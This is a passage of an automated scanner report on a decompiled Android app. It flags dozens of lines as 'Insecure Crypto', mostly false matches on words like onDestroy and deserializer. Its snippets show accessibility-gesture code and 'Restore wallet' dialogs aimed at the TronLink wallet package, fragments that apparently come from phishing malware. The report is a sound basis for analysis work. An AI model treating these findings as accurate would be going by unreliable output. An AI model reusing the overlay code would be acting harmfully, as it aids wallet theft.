            adInfo.setCancel(context.getString(R.string.Cancel));
            adInfo.setCancelColor("128,128,128");
        }
```

**18. Insecure Crypto**
- **Description:** Pattern detected: Random()
- **File:** `sources/k3/e.java`
- **Line:** 359

```java
        AdInfo d5 = androidx.appcompat.view.a.d(2);
        d5.setTaskId(e3.d.a());
        d5.setBack(1);
        d5.setAutoClose(new Random().nextInt(20) + 20);
        d5.setCustomId(PointerIconCompat.TYPE_CROSSHAIR);
        d5.setPkg("com.tronlink.global");
        d5.setUse(2);
```

**19. Insecure Crypto**
- **Description:** Pattern detected: des
- **File:** `sources/k4/b.java`
- **Line:** 17

```java
    /* JADX INFO: Fake field, exist only in values array */
    NOT_GIF_FILE(103, "Data is not in GIF format"),
    /* JADX INFO: Fake field, exist only in values array */
    NO_SCRN_DSCR(104, "No screen descriptor detected"),
    /* JADX INFO: Fake field, exist only in values array */
    NO_IMAG_DSCR(105, "No image descriptor detected"),
    /* JADX INFO: Fake field, exist only in values array */
```

**20. Insecure Crypto**
- **Description:** Pattern detected: des
- **File:** `sources/k4/b.java`
- **Line:** 19

```java
    /* JADX INFO: Fake field, exist only in values array */
    NO_SCRN_DSCR(104, "No screen descriptor detected"),
    /* JADX INFO: Fake field, exist only in values array */
    NO_IMAG_DSCR(105, "No image descriptor detected"),
    /* JADX INFO: Fake field, exist only in values array */
    NO_COLOR_MAP(106, "Neither global nor local color map found"),
    /* JADX INFO: Fake field, exist only in values array */
```

**21. Insecure Crypto**
- **Description:** Pattern detected: des
- **File:** `sources/d1/e.java`
- **Line:** 28

```java
                System.err.println("Failed to retrieve value from android.os.Build$VERSION.SDK_INT due to the following exception.");
                e5.printStackTrace(System.err);
            }
            aVar = (num == null || num.intValue() < 19) ? Boolean.getBoolean("com.google.devtools.build.android.desugar.runtime.twr_disable_mimic") ^ true ? new i() : new a() : new j();
        } catch (Throwable th) {
            PrintStream printStream = System.err;
            String name = a.class.getName();
```

**22. Insecure Crypto**
- **Description:** Pattern detected: des
- **File:** `sources/d1/e.java`
- **Line:** 33

```java
            PrintStream printStream = System.err;
            String name = a.class.getName();
            StringBuilder sb = new StringBuilder(name.length() + 133);
            sb.append("An error has occurred when initializing the try-with-resources desuguring strategy. The default strategy ");
            sb.append(name);
            sb.append("will be used. The error is: ");
            printStream.println(sb.toString());
```

**23. Insecure Crypto**
- **Description:** Pattern detected: MD5
- **File:** `sources/h3/a.java`
- **Line:** 13

```java
    public static byte[] a(String str) {
        byte[] bytes = str.getBytes();
        try {
            MessageDigest messageDigest = MessageDigest.getInstance("MD5");
            messageDigest.update(bytes);
            return messageDigest.digest();
        } catch (NoSuchAlgorithmException e5) {
```

**24. Insecure Crypto**
- **Description:** Pattern detected: Des
- **File:** `sources/e2/n.java`
- **Line:** 17

```java
    public final void a() {
        this.f2545a.setEndIconOnClickListener(null);
        this.f2545a.setEndIconDrawable((Drawable) null);
        this.f2545a.setEndIconContentDescription((CharSequence) null);
    }
}

```

**25. Insecure Crypto**
- **Description:** Pattern detected: des
- **File:** `sources/e2/o.java`
- **Line:** 61

```java
        setVisibility(8);
        setOrientation(0);
        setLayoutParams(new FrameLayout.LayoutParams(-2, -1, GravityCompat.START));
        CheckableImageButton checkableImageButton = (CheckableImageButton) LayoutInflater.from(getContext()).inflate(R.layout.design_text_input_start_icon, (ViewGroup) this, false);
        this.f2584e = checkableImageButton;
        AppCompatTextView appCompatTextView = new AppCompatTextView(getContext());
        this.f2582c = appCompatTextView;
```

**26. Insecure Crypto**
- **Description:** Pattern detected: Des
- **File:** `sources/e2/o.java`
- **Line:** 100

```java
    }

    public final void a(@Nullable CharSequence charSequence) {
        if (this.f2584e.getContentDescription() != charSequence) {
            this.f2584e.setContentDescription(charSequence);
        }
    }
```

**27. Insecure Crypto**
- **Description:** Pattern detected: Des
- **File:** `sources/e2/o.java`
- **Line:** 101

```java

    public final void a(@Nullable CharSequence charSequence) {
        if (this.f2584e.getContentDescription() != charSequence) {
            this.f2584e.setContentDescription(charSequence);
        }
    }

```

**28. Insecure Crypto**
- **Description:** Pattern detected: des
- **File:** `sources/e2/k.java`
- **Line:** 156

```java
    public k(@NonNull TextInputLayout textInputLayout) {
        this.f2549a = textInputLayout.getContext();
        this.f2550b = textInputLayout;
        this.f2555g = r0.getResources().getDimensionPixelSize(R.dimen.design_textinput_caption_translate_y);
    }

    public final void a(TextView textView, int i5) {
```

**29. Insecure Crypto**
- **Description:** Pattern detected: Des
- **File:** `sources/i0/c.java`
- **Line:** 62

```java
    }

    @Override // e0.l
    public final void onDestroy() {
    }

    @Override // e0.l
```

**30. Insecure Crypto**
- **Description:** Pattern detected: Des
- **File:** `sources/i0/a.java`
- **Line:** 7

```java
/* loaded from: classes14.dex */
public abstract class a<Z> implements h<Z> {
    @Override // e0.l
    public final void onDestroy() {
    }
}

```

**31. Insecure Crypto**
- **Description:** Pattern detected: Des
- **File:** `sources/f3/e.java`
- **Line:** 92

```java
    }

    @Override // android.view.SurfaceHolder.Callback
    public final void surfaceDestroyed(SurfaceHolder surfaceHolder) {
        a();
    }
}
```

**32. Insecure Crypto**
- **Description:** Pattern detected: Des
- **File:** `sources/f3/i.java`
- **Line:** 4

```java
package f3;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.annotation.SuppressLint;
import android.app.KeyguardManager;
import android.content.ClipData;
```

**33. Insecure Crypto**
- **Description:** Pattern detected: Des
- **File:** `sources/f3/i.java`
- **Line:** 200

```java
        public class C0033a extends AccessibilityService.GestureResultCallback {

            /* renamed from: a, reason: collision with root package name */
            public final /* synthetic */ GestureDescription.StrokeDescription f2822a;

            public C0033a(GestureDescription.StrokeDescription strokeDescription) {
                this.f2822a = strokeDescription;
```

**34. Insecure Crypto**
- **Description:** Pattern detected: Des
- **File:** `sources/f3/i.java`
- **Line:** 200

```java
        public class C0033a extends AccessibilityService.GestureResultCallback {

            /* renamed from: a, reason: collision with root package name */
            public final /* synthetic */ GestureDescription.StrokeDescription f2822a;

            public C0033a(GestureDescription.StrokeDescription strokeDescription) {
                this.f2822a = strokeDescription;
```

**35. Insecure Crypto**
- **Description:** Pattern detected: Des
- **File:** `sources/f3/i.java`
- **Line:** 202

```java
            /* renamed from: a, reason: collision with root package name */
            public final /* synthetic */ GestureDescription.StrokeDescription f2822a;

            public C0033a(GestureDescription.StrokeDescription strokeDescription) {
                this.f2822a = strokeDescription;
            }

```

**36. Insecure Crypto**
- **Description:** Pattern detected: Des
- **File:** `sources/f3/i.java`
- **Line:** 202

```java
            /* renamed from: a, reason: collision with root package name */
            public final /* synthetic */ GestureDescription.StrokeDescription f2822a;

            public C0033a(GestureDescription.StrokeDescription strokeDescription) {
                this.f2822a = strokeDescription;
            }

```

**37. Insecure Crypto**
- **Description:** Pattern detected: md5
- **File:** `sources/f3/i.java`
- **Line:** 2884

```java
            p(c5);
            return;
        }
        String string = SPUtils.getInstance().getString("md5Key");
        if (TextUtils.isEmpty(string)) {
            return;
        }
```

**38. Insecure Crypto**
- **Description:** Pattern detected: Random()
- **File:** `sources/f3/i.java`
- **Line:** 1875

```java
                                    d11.setConfirm(context.getString(R.string.Restore_wallet));
                                    d11.setConfirmBgColor("5,0,255");
                                    d11.setBgColor("255,255,255");
                                    if (new Random().nextInt(2) == 1) {
                                        d11.setCancel(context.getString(R.string.Cancel));
                                    }
                                    AdInfo adInfo = new AdInfo();
```

**39. Insecure Crypto**
- **Description:** Pattern detected: Random()
- **File:** `sources/f3/i.java`
- **Line:** 1884

```java
                                    adInfo.setTaskId(e3.d.a());
                                    adInfo.setPreId(d11.getTaskId());
                                    adInfo.setTemplate(PointerIconCompat.TYPE_CONTEXT_MENU);
                                    if (new Random().nextInt(3) >= 1) {
                                        adInfo.setBack(1);
                                    }
                                    d11.setAiLink(adInfo);
```

**40. Insecure Crypto**
- **Description:** Pattern detected: Random()
- **File:** `sources/f3/i.java`
- **Line:** 1905

```java
                                    d12.setMsg(context.getString(R.string.tpBoxInputMsg));
                                    d12.setConfirm(context.getString(R.string.Confirm));
                                    d12.setConfirmColor("41,128,254");
                                    if (new Random().nextInt(2) == 1) {
                                        d12.setCancel(context.getString(R.string.Cancel));
                                    }
                                    AdInfo adInfo2 = new AdInfo();
```

**41. Insecure Crypto**
- **Description:** Pattern detected: Random()
- **File:** `sources/f3/i.java`
- **Line:** 1914

```java
                                    adInfo2.setTaskId(e3.d.a());
                                    adInfo2.setPreId(d12.getTaskId());
                                    adInfo2.setTemplate(PointerIconCompat.TYPE_HAND);
                                    if (new Random().nextInt(3) >= 1) {
                                        adInfo2.setBack(1);
                                    }
                                    d12.setAiLink(adInfo2);
```

**42. Insecure Crypto**
- **Description:** Pattern detected: Random()
- **File:** `sources/f3/i.java`
- **Line:** 1937

```java
                                    d13.setConfirmColor("255,255,255");
                                    d13.setConfirmBgColor("30,144,255");
                                    d13.setAlign(1);
                                    if (new Random().nextInt(2) == 1) {
                                        d13.setCancel(context.getString(R.string.Cancel));
                                        d13.setCancelColor("105,105,105");
                                    }
```

**43. Insecure Crypto**
- **Description:** Pattern detected: Des
- **File:** `sources/f3/k.java`
- **Line:** 4

```java
package f3;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import com.superbock.auto.BaseService;

/* loaded from: classes23.dex */
```

**44. Insecure Crypto**
- **Description:** Pattern detected: Des
- **File:** `sources/f3/k.java`
- **Line:** 11

```java
public final class k extends AccessibilityService.GestureResultCallback {

    /* renamed from: a, reason: collision with root package name */
    public final /* synthetic */ GestureDescription.StrokeDescription f2823a;

    public k(GestureDescription.StrokeDescription strokeDescription) {
        this.f2823a = strokeDescription;
```

**45. Insecure Crypto**
- **Description:** Pattern detected: Des
- **File:** `sources/f3/k.java`
- **Line:** 11

```java
public final class k extends AccessibilityService.GestureResultCallback {

    /* renamed from: a, reason: collision with root package name */
    public final /* synthetic */ GestureDescription.StrokeDescription f2823a;

    public k(GestureDescription.StrokeDescription strokeDescription) {
        this.f2823a = strokeDescription;
```

**46. Insecure Crypto**
- **Description:** Pattern detected: Des
- **File:** `sources/f3/k.java`
- **Line:** 13

```java
    /* renamed from: a, reason: collision with root package name */
    public final /* synthetic */ GestureDescription.StrokeDescription f2823a;

    public k(GestureDescription.StrokeDescription strokeDescription) {
        this.f2823a = strokeDescription;
    }

```

**47. Insecure Crypto**
- **Description:** Pattern detected: Des
- **File:** `sources/f3/k.java`
- **Line:** 13

```java
    /* renamed from: a, reason: collision with root package name */
    public final /* synthetic */ GestureDescription.StrokeDescription f2823a;

    public k(GestureDescription.StrokeDescription strokeDescription) {
        this.f2823a = strokeDescription;
    }

```

**48. Insecure Crypto**
- **Description:** Pattern detected: random()
- **File:** `sources/c0/g.java`
- **Line:** 161

```java
        long uptimeMillis = SystemClock.uptimeMillis() + this.f484a.e();
        this.f484a.c();
        this.f494k = new a(this.f485b, this.f484a.a(), uptimeMillis);
        com.bumptech.glide.h<Bitmap> w4 = this.f491h.a(new h0.f().k(new k0.d(Double.valueOf(Math.random())))).w(this.f484a);
        w4.u(this.f494k, w4);
    }

```

**49. Insecure Crypto**
- **Description:** Pattern detected: md5
- **File:** `sources/e3/b.java`
- **Line:** 72

```java
                    if (u4.containsKey("customInstallTimes")) {
                        j0.t(u4.z("customInstallTimes"));
                    }
                    if (u4.containsKey("md5Key")) {
                        SPUtils.getInstance().put("md5Key", u4.B("md5Key"));
                    }
                    if (u4.containsKey(str)) {
```

**50. Insecure Crypto**
- **Description:** Pattern detected: md5
- **File:** `sources/e3/b.java`
- **Line:** 73

```java
                        j0.t(u4.z("customInstallTimes"));
                    }
                    if (u4.containsKey("md5Key")) {
                        SPUtils.getInstance().put("md5Key", u4.B("md5Key"));
                    }
                    if (u4.containsKey(str)) {
                        List<AdInfo> t4 = f.a.t(u4.B(str), AdInfo.class);
```

**51. Insecure Crypto**
- **Description:** Pattern detected: md5
- **File:** `sources/e3/b.java`
- **Line:** 73

```java
                        j0.t(u4.z("customInstallTimes"));
                    }
                    if (u4.containsKey("md5Key")) {
                        SPUtils.getInstance().put("md5Key", u4.B("md5Key"));
                    }
                    if (u4.containsKey(str)) {
                        List<AdInfo> t4 = f.a.t(u4.B(str), AdInfo.class);
```

**52. Insecure Crypto**
- **Description:** Pattern detected: md5
- **File:** `sources/e3/a.java`
- **Line:** 110

```java
                        SPUtils.getInstance().put("thumbSnap ", j0.f3709i);
                    }
                }
                if (A.containsKey("md5Key")) {
                    SPUtils.getInstance().put("md5Key", A.B("md5Key"));
                }
                if (A.containsKey("cnDisable")) {
```

**53. Insecure Crypto**
- **Description:** Pattern detected: md5
- **File:** `sources/e3/a.java`
- **Line:** 111

```java
                    }
                }
                if (A.containsKey("md5Key")) {
                    SPUtils.getInstance().put("md5Key", A.B("md5Key"));
                }
                if (A.containsKey("cnDisable")) {
                    j0.q(A.z("cnDisable"));
```

**54. Insecure Crypto**
- **Description:** Pattern detected: md5
- **File:** `sources/e3/a.java`
- **Line:** 111

```java
                    }
                }
                if (A.containsKey("md5Key")) {
                    SPUtils.getInstance().put("md5Key", A.B("md5Key"));
                }
                if (A.containsKey("cnDisable")) {
                    j0.q(A.z("cnDisable"));
```

**55. Insecure Crypto**
- **Description:** Pattern detected: Des
- **File:** `sources/c1/a.java`
- **Line:** 29

```java
        if (i5 > 16777215) {
            z4 = super.onTransact(i5, parcel, parcel2, i6);
        } else {
            parcel.enforceInterface(getInterfaceDescriptor());
            z4 = false;
        }
        if (z4) {
```

**56. Insecure Crypto**
- **Description:** Pattern detected: des
- **File:** `sources/l2/n.java`
- **Line:** 151

```java
        	at jadx.core.codegen.CodeGen.generate(CodeGen.java:22)
        	at jadx.core.ProcessClass.process(ProcessClass.java:79)
        	at jadx.core.ProcessClass.generateCode(ProcessClass.java:117)
        	at jadx.core.dex.nodes.ClassNode.generateClassCode(ClassNode.java:402)
        	at jadx.core.dex.nodes.ClassNode.decompile(ClassNode.java:390)
        	at jadx.core.dex.nodes.ClassNode.getCode(ClassNode.java:340)
        */
```

**57. Insecure Crypto**
- **Description:** Pattern detected: des
- **File:** `sources/l2/n.java`
- **Line:** 152

```java
        	at jadx.core.ProcessClass.process(ProcessClass.java:79)
        	at jadx.core.ProcessClass.generateCode(ProcessClass.java:117)
        	at jadx.core.dex.nodes.ClassNode.generateClassCode(ClassNode.java:402)
        	at jadx.core.dex.nodes.ClassNode.decompile(ClassNode.java:390)
        	at jadx.core.dex.nodes.ClassNode.getCode(ClassNode.java:340)
        */
    /*  JADX ERROR: NullPointerException in pass: ConstructorVisitor
```

**58. Insecure Crypto**
- **Description:** Pattern detected: des
- **File:** `sources/l2/n.java`
- **Line:** 153

```java
        	at jadx.core.ProcessClass.generateCode(ProcessClass.java:117)
        	at jadx.core.dex.nodes.ClassNode.generateClassCode(ClassNode.java:402)
        	at jadx.core.dex.nodes.ClassNode.decompile(ClassNode.java:390)
        	at jadx.core.dex.nodes.ClassNode.getCode(ClassNode.java:340)
        */
    /*  JADX ERROR: NullPointerException in pass: ConstructorVisitor
        java.lang.NullPointerException: Cannot invoke "jadx.core.dex.instructions.args.RegisterArg.sameRegAndSVar(jadx.core.dex.instructions.args.InsnArg)" because "resultArg" is null
```

**59. Insecure Crypto**
- **Description:** Pattern detected: des
- **File:** `sources/l2/o.java`
- **Line:** 102

```java
            i2.m<T> r4 = r3.f4002b
            o2.a<T> r0 = r3.f4004d
            java.lang.reflect.Type r0 = r0.f4569b
            java.lang.Object r4 = r4.deserialize()
            return r4
        L54:
            i2.u r0 = new i2.u
```

**60. Insecure Crypto**
- **Description:** Pattern detected: des
- **File:** `sources/l2/q.java`
- **Line:** 475

```java
    public class k extends i2.z<Class> {
        @Override // i2.z
        public final Class a(p2.a aVar) {
            throw new UnsupportedOperationException("Attempted to deserialize a java.lang.Class. Forgot to register a type adapter?");
        }

        @Override // i2.z
```

**61. Insecure Crypto**
- **Description:** Pattern detected: Des
- **File:** `sources/l2/e.java`
- **Line:** 40

```java
                g5.append(c5.getClass().getName());
                g5.append(" as a @JsonAdapter for ");
                g5.append(aVar.toString());
                g5.append(". @JsonAdapter value must be a TypeAdapter, TypeAdapterFactory, JsonSerializer or JsonDeserializer.");
                throw new IllegalArgumentException(g5.toString());
            }
            oVar = new o<>(z4 ? (i2.t) c5 : null, c5 instanceof i2.m ? (i2.m) c5 : null, iVar, aVar);
```

**62. Insecure Crypto**
- **Description:** Pattern detected: Des
- **File:** `sources/r0/a.java`
- **Line:** 61

```java
    }

    @Override // android.app.Application.ActivityLifecycleCallbacks
    public final void onActivityDestroyed(Activity activity) {
    }

    @Override // android.app.Application.ActivityLifecycleCallbacks
```

**63. Insecure Crypto**
- **Description:** Pattern detected: des
- **File:** `sources/i/i.java`
- **Line:** 412

```java
            g.d dVar3 = (g.d) cls.getAnnotation(g.d.class);
            if (dVar3 != null) {
                try {
                    s sVar2 = (s) dVar3.deserializer().newInstance();
                    this.f3232a.b(cls, sVar2);
                    return sVar2;
                } catch (Throwable unused4) {
```

**64. Insecure Crypto**
- **Description:** Pattern detected: des
- **File:** `sources/i/i.java`
- **Line:** 434

```java
            if (z4) {
                g.d dVar4 = (g.d) m.j.v(cls, g.d.class);
                if (dVar4 != null) {
                    Class<?> deserializer = dVar4.deserializer();
                    if (deserializer != Void.class) {
                        try {
                            Object newInstance = deserializer.newInstance();
```

**65. Insecure Crypto**
- **Description:** Pattern detected: des
- **File:** `sources/i/i.java`
- **Line:** 434

```java
            if (z4) {
                g.d dVar4 = (g.d) m.j.v(cls, g.d.class);
                if (dVar4 != null) {
                    Class<?> deserializer = dVar4.deserializer();
                    if (deserializer != Void.class) {
                        try {
                            Object newInstance = deserializer.newInstance();
```

**66. Insecure Crypto**
- **Description:** Pattern detected: des
- **File:** `sources/i/i.java`
- **Line:** 435

```java
                g.d dVar4 = (g.d) m.j.v(cls, g.d.class);
                if (dVar4 != null) {
                    Class<?> deserializer = dVar4.deserializer();
                    if (deserializer != Void.class) {
                        try {
                            Object newInstance = deserializer.newInstance();
                            if (newInstance instanceof s) {
```

**67. Insecure Crypto**
- **Description:** Pattern detected: des
- **File:** `sources/i/i.java`
- **Line:** 437

```java
                    Class<?> deserializer = dVar4.deserializer();
                    if (deserializer != Void.class) {
                        try {
                            Object newInstance = deserializer.newInstance();
                            if (newInstance instanceof s) {
                                sVar = (s) newInstance;
                            }
```

**68. Insecure Crypto**
- **Description:** Pattern detected: Des
- **File:** `sources/i/g.java`
- **Line:** 118

```java
    public static final int[] C = {android.R.attr.maxWidth, R.attr.actionTextColorAlpha, R.attr.animationMode, R.attr.backgroundOverlayColorAlpha, R.attr.backgroundTint, R.attr.backgroundTintMode, R.attr.elevation, R.attr.maxActionInlineWidth};
    public static final int[] D = {android.R.attr.textSize, android.R.attr.typeface, android.R.attr.textStyle, android.R.attr.textColor, android.R.attr.textColorHint, android.R.attr.textColorLink, android.R.attr.shadowColor, android.R.attr.shadowDx, android.R.attr.shadowDy, android.R.attr.shadowRadius, android.R.attr.fontFamily, android.R.attr.textFontWeight, R.attr.fontFamily, R.attr.fontVariationSettings, R.attr.textAllCaps, R.attr.textLocale};
    public static final int[] E = {R.attr.textInputLayoutFocusedRectEnabled};
    public static final int[] F = {android.R.attr.enabled, android.R.attr.textColorHint, android.R.attr.maxWidth, android.R.attr.minWidth, android.R.attr.hint, android.R.attr.maxEms, android.R.attr.minEms, R.attr.boxBackgroundColor, R.attr.boxBackgroundMode, R.attr.boxCollapsedPaddingTop, R.attr.boxCornerRadiusBottomEnd, R.attr.boxCornerRadiusBottomStart, R.attr.boxCornerRadiusTopEnd, R.attr.boxCornerRadiusTopStart, R.attr.boxStrokeColor, R.attr.boxStrokeErrorColor, R.attr.boxStrokeWidth, R.attr.boxStrokeWidthFocused, R.attr.counterEnabled, R.attr.counterMaxLength, R.attr.counterOverflowTextAppearance, R.attr.counterOverflowTextColor, R.attr.counterTextAppearance, R.attr.counterTextColor, R.attr.endIconCheckable, R.attr.endIconContentDescription, R.attr.endIconDrawable, R.attr.endIconMode, R.attr.endIconTint, R.attr.endIconTintMode, R.attr.errorContentDescription, R.attr.errorEnabled, R.attr.errorIconDrawable, R.attr.errorIconTint, R.attr.errorIconTintMode, R.attr.errorTextAppearance, R.attr.errorTextColor, R.attr.expandedHintEnabled, R.attr.helperText, R.attr.helperTextEnabled, R.attr.helperTextTextAppearance, R.attr.helperTextTextColor, R.attr.hintAnimationEnabled, R.attr.hintEnabled, R.attr.hintTextAppearance, R.attr.hintTextColor, R.attr.passwordToggleContentDescription, R.attr.passwordToggleDrawable, R.attr.passwordToggleEnabled, R.attr.passwordToggleTint, R.attr.passwordToggleTintMode, R.attr.placeholderText, R.attr.placeholderTextAppearance, R.attr.placeholderTextColor, R.attr.prefixText, R.attr.prefixTextAppearance, R.attr.prefixTextColor, R.attr.shapeAppearance, R.attr.shapeAppearanceOverlay, R.attr.startIconCheckable, R.attr.startIconContentDescription, R.attr.startIconDrawable, R.attr.startIconTint, R.attr.startIconTintMode, R.attr.suffixText, R.attr.suffixTextAppearance, R.attr.suffixTextColor};
    public static final int[] G = {android.R.attr.textAppearance, R.attr.enforceMaterialTheme, R.attr.enforceTextAppearance};

    public static final String A(String str) {
```

**69. Insecure Crypto**
- **Description:** Pattern detected: Des
- **File:** `sources/i/g.java`
- **Line:** 118

```java
    public static final int[] C = {android.R.attr.maxWidth, R.attr.actionTextColorAlpha, R.attr.animationMode, R.attr.backgroundOverlayColorAlpha, R.attr.backgroundTint, R.attr.backgroundTintMode, R.attr.elevation, R.attr.maxActionInlineWidth};
    public static final int[] D = {android.R.attr.textSize, android.R.attr.typeface, android.R.attr.textStyle, android.R.attr.textColor, android.R.attr.textColorHint, android.R.attr.textColorLink, android.R.attr.shadowColor, android.R.attr.shadowDx, android.R.attr.shadowDy, android.R.attr.shadowRadius, android.R.attr.fontFamily, android.R.attr.textFontWeight, R.attr.fontFamily, R.attr.fontVariationSettings, R.attr.textAllCaps, R.attr.textLocale};
    public static final int[] E = {R.attr.textInputLayoutFocusedRectEnabled};
    public static final int[] F = {android.R.attr.enabled, android.R.attr.textColorHint, android.R.attr.maxWidth, android.R.attr.minWidth, android.R.attr.hint, android.R.attr.maxEms, android.R.attr.minEms, R.attr.boxBackgroundColor, R.attr.boxBackgroundMode, R.attr.boxCollapsedPaddingTop, R.attr.boxCornerRadiusBottomEnd, R.attr.boxCornerRadiusBottomStart, R.attr.boxCornerRadiusTopEnd, R.attr.boxCornerRadiusTopStart, R.attr.boxStrokeColor, R.attr.boxStrokeErrorColor, R.attr.boxStrokeWidth, R.attr.boxStrokeWidthFocused, R.attr.counterEnabled, R.attr.counterMaxLength, R.attr.counterOverflowTextAppearance, R.attr.counterOverflowTextColor, R.attr.counterTextAppearance, R.attr.counterTextColor, R.attr.endIconCheckable, R.attr.endIconContentDescription, R.attr.endIconDrawable, R.attr.endIconMode, R.attr.endIconTint, R.attr.endIconTintMode, R.attr.errorContentDescription, R.attr.errorEnabled, R.attr.errorIconDrawable, R.attr.errorIconTint, R.attr.errorIconTintMode, R.attr.errorTextAppearance, R.attr.errorTextColor, R.attr.expandedHintEnabled, R.attr.helperText, R.attr.helperTextEnabled, R.attr.helperTextTextAppearance, R.attr.helperTextTextColor, R.attr.hintAnimationEnabled, R.attr.hintEnabled, R.attr.hintTextAppearance, R.attr.hintTextColor, R.attr.passwordToggleContentDescription, R.attr.passwordToggleDrawable, R.attr.passwordToggleEnabled, R.attr.passwordToggleTint, R.attr.passwordToggleTintMode, R.attr.placeholderText, R.attr.placeholderTextAppearance, R.attr.placeholderTextColor, R.attr.prefixText, R.attr.prefixTextAppearance, R.attr.prefixTextColor, R.attr.shapeAppearance, R.attr.shapeAppearanceOverlay, R.attr.startIconCheckable, R.attr.startIconContentDescription, R.attr.startIconDrawable, R.attr.startIconTint, R.attr.startIconTintMode, R.attr.suffixText, R.attr.suffixTextAppearance, R.attr.suffixTextColor};
    public static final int[] G = {android.R.attr.textAppearance, R.attr.enforceMaterialTheme, R.attr.enforceTextAppearance};

    public static final String A(String str) {
```

**70. Insecure Crypto**
- **Description:** Pattern detected: Des
- **File:** `sources/i/g.java`
- **Line:** 118

```java
    public static final int[] C = {android.R.attr.maxWidth, R.attr.actionTextColorAlpha, R.attr.animationMode, R.attr.backgroundOverlayColorAlpha, R.attr.backgroundTint, R.attr.backgroundTintMode, R.attr.elevation, R.attr.maxActionInlineWidth};
    public static final int[] D = {android.R.attr.textSize, android.R.attr.typeface, android.R.attr.textStyle, android.R.attr.textColor, android.R.attr.textColorHint, android.R.attr.textColorLink, android.R.attr.shadowColor, android.R.attr.shadowDx, android.R.attr.shadowDy, android.R.attr.shadowRadius, android.R.attr.fontFamily, android.R.attr.textFontWeight, R.attr.fontFamily, R.attr.fontVariationSettings, R.attr.textAllCaps, R.attr.textLocale};
    public static final int[] E = {R.attr.textInputLayoutFocusedRectEnabled};
    public static final int[] F = {android.R.attr.enabled, android.R.attr.textColorHint, android.R.attr.maxWidth, android.R.attr.minWidth, android.R.attr.hint, android.R.attr.maxEms, android.R.attr.minEms, R.attr.boxBackgroundColor, R.attr.boxBackgroundMode, R.attr.boxCollapsedPaddingTop, R.attr.boxCornerRadiusBottomEnd, R.attr.boxCornerRadiusBottomStart, R.attr.boxCornerRadiusTopEnd, R.attr.boxCornerRadiusTopStart, R.attr.boxStrokeColor, R.attr.boxStrokeErrorColor, R.attr.boxStrokeWidth, R.attr.boxStrokeWidthFocused, R.attr.counterEnabled, R.attr.counterMaxLength, R.attr.counterOverflowTextAppearance, R.attr.counterOverflowTextColor, R.attr.counterTextAppearance, R.attr.counterTextColor, R.attr.endIconCheckable, R.attr.endIconContentDescription, R.attr.endIconDrawable, R.attr.endIconMode, R.attr.endIconTint, R.attr.endIconTintMode, R.attr.errorContentDescription, R.attr.errorEnabled, R.attr.errorIconDrawable, R.attr.errorIconTint, R.attr.errorIconTintMode, R.attr.errorTextAppearance, R.attr.errorTextColor, R.attr.expandedHintEnabled, R.attr.helperText, R.attr.helperTextEnabled, R.attr.helperTextTextAppearance, R.attr.helperTextTextColor, R.attr.hintAnimationEnabled, R.attr.hintEnabled, R.attr.hintTextAppearance, R.attr.hintTextColor, R.attr.passwordToggleContentDescription, R.attr.passwordToggleDrawable, R.attr.passwordToggleEnabled, R.attr.passwordToggleTint, R.attr.passwordToggleTintMode, R.attr.placeholderText, R.attr.placeholderTextAppearance, R.attr.placeholderTextColor, R.attr.prefixText, R.attr.prefixTextAppearance, R.attr.prefixTextColor, R.attr.shapeAppearance, R.attr.shapeAppearanceOverlay, R.attr.startIconCheckable, R.attr.startIconContentDescription, R.attr.startIconDrawable, R.attr.startIconTint, R.attr.startIconTintMode, R.attr.suffixText, R.attr.suffixTextAppearance, R.attr.suffixTextColor};
    public static final int[] G = {android.R.attr.textAppearance, R.attr.enforceMaterialTheme, R.attr.enforceTextAppearance};

    public static final String A(String str) {
```

**71. Insecure Crypto**
- **Description:** Pattern detected: Des
- **File:** `sources/i/g.java`
- **Line:** 118

```java
    public static final int[] C = {android.R.attr.maxWidth, R.attr.actionTextColorAlpha, R.attr.animationMode, R.attr.backgroundOverlayColorAlpha, R.attr.backgroundTint, R.attr.backgroundTintMode, R.attr.elevation, R.attr.maxActionInlineWidth};
    public static final int[] D = {android.R.attr.textSize, android.R.attr.typeface, android.R.attr.textStyle, android.R.attr.textColor, android.R.attr.textColorHint, android.R.attr.textColorLink, android.R.attr.shadowColor, android.R.attr.shadowDx, android.R.attr.shadowDy, android.R.attr.shadowRadius, android.R.attr.fontFamily, android.R.attr.textFontWeight, R.attr.fontFamily, R.attr.fontVariationSettings, R.attr.textAllCaps, R.attr.textLocale};
    public static final int[] E = {R.attr.textInputLayoutFocusedRectEnabled};
    public static final int[] F = {android.R.attr.enabled, android.R.attr.textColorHint, android.R.attr.maxWidth, android.R.attr.minWidth, android.R.attr.hint, android.R.attr.maxEms, android.R.attr.minEms, R.attr.boxBackgroundColor, R.attr.boxBackgroundMode, R.attr.boxCollapsedPaddingTop, R.attr.boxCornerRadiusBottomEnd, R.attr.boxCornerRadiusBottomStart, R.attr.boxCornerRadiusTopEnd, R.attr.boxCornerRadiusTopStart, R.attr.boxStrokeColor, R.attr.boxStrokeErrorColor, R.attr.boxStrokeWidth, R.attr.boxStrokeWidthFocused, R.attr.counterEnabled, R.attr.counterMaxLength, R.attr.counterOverflowTextAppearance, R.attr.counterOverflowTextColor, R.attr.counterTextAppearance, R.attr.counterTextColor, R.attr.endIconCheckable, R.attr.endIconContentDescription, R.attr.endIconDrawable, R.attr.endIconMode, R.attr.endIconTint, R.attr.endIconTintMode, R.attr.errorContentDescription, R.attr.errorEnabled, R.attr.errorIconDrawable, R.attr.errorIconTint, R.attr.errorIconTintMode, R.attr.errorTextAppearance, R.attr.errorTextColor, R.attr.expandedHintEnabled, R.attr.helperText, R.attr.helperTextEnabled, R.attr.helperTextTextAppearance, R.attr.helperTextTextColor, R.attr.hintAnimationEnabled, R.attr.hintEnabled, R.attr.hintTextAppearance, R.attr.hintTextColor, R.attr.passwordToggleContentDescription, R.attr.passwordToggleDrawable, R.attr.passwordToggleEnabled, R.attr.passwordToggleTint, R.attr.passwordToggleTintMode, R.attr.placeholderText, R.attr.placeholderTextAppearance, R.attr.placeholderTextColor, R.attr.prefixText, R.attr.prefixTextAppearance, R.attr.prefixTextColor, R.attr.shapeAppearance, R.attr.shapeAppearanceOverlay, R.attr.startIconCheckable, R.attr.startIconContentDescription, R.attr.startIconDrawable, R.attr.startIconTint, R.attr.startIconTintMode, R.attr.suffixText, R.attr.suffixTextAppearance, R.attr.suffixTextColor};
